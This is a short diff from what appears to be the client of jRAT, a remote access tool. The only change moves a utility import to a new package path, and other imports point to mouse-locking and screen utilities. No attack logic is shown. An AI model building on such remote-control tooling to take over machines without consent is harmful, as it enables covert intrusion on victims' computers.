@@ -1,6 +1,6 @@
 package jrat.client.packets.incoming;
 
-import io.jrat.common.utils.Utils;
+import jrat.common.utils.Utils;
 import jrat.client.Connection;
 import jrat.client.MouseLock;
 import jrat.client.utils.ScreenUtils;
